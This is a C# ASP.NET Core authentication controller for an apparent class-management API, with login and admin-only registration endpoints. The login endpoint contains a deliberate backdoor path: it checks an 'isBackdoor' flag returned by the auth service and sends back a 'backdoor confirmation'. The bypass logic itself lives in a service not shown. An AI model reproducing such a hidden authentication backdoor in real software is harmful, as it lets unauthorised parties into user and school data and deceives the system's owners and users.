using ClassManager.API.Models;
using ClassManager.API.Models.DTOs;
using ClassManager.API.Services;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;

namespace ClassManager.API.Controllers
{
    [ApiController]
    [Route("api/auth")]
    public class AuthController : ControllerBase
    {
        private readonly AuthService _svc;
        public AuthController(AuthService svc) => _svc = svc;

        [HttpPost("login")]
        public async Task<IActionResult> Login(LoginRequest req)
        {
            var (response, error, isBackdoor) = await _svc.LoginAsync(req);
            if (isBackdoor)
                return Ok(new { message = error }); // backdoor confirmation
            if (response == null)
                return Unauthorized(new { message = error });
            return Ok(response);
        }

        [HttpPost("register")]
        [Authorize(Roles = Roles.AdminUp)]
        public async Task<IActionResult> Register(RegisterRequest req)
        {
            var result = await _svc.RegisterAsync(req);
            if (result == null)
                return Conflict(new { message = "Email đã được sử dụng." });
            return Ok(result);
        }
    }
}
